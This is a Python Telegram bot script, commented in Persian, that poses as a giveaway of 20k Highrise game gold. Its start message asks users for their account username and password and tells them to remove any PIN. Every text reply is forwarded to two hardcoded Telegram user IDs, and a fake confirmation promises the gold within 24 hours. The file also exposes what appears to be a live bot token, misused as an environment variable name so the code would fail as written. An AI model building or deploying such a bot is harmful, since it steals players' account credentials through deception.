import os
import logging
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from telegram import ParseMode

# خواندن متغیرها از محیط
TOKEN = os.getenv("7979977202:AAGemwJZ0fEQgh9Il8zS1R7u-y7Rk-KC63o")
OWNER_ID = int(os.getenv("8063487089"))
FRIEND_ID = int(os.getenv("6006610272"))

# لاگ‌گیری
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# دستور /start
def start(update, context):
    update.message.reply_text("Hello! Welcome to the Highrise 20k bot.
Please enter your account username and password to get your 20k gold.

Example:
nickname (ID): @mehmet_1002
password: 123456789

If you have a PIN on your account, please remove it.")

# هندل پیام‌ها
def forward_message(update, context):
    message = update.message

    # فورواد برای صاحب و دوست
    for user_id in [8063487089, 6006610272]:
        try:
            context.bot.forward_message(chat_id=user_id, from_chat_id=message.chat_id, message_id=message.message_id)
        except Exception as e:
            logger.warning(f"نتونستم پیام رو برای {user_id} بفرستم: {e}")

    # پیام تأیید
    message.reply_text("Your information has been registered✅, you will receive 20k in less than 24 hours
Please be patient .")

def main():
    updater = Updater(token=TOKEN, use_context=True)
    dp = updater.dispatcher

    # هندلرها
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, forward_message))

    # شروع ربات
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
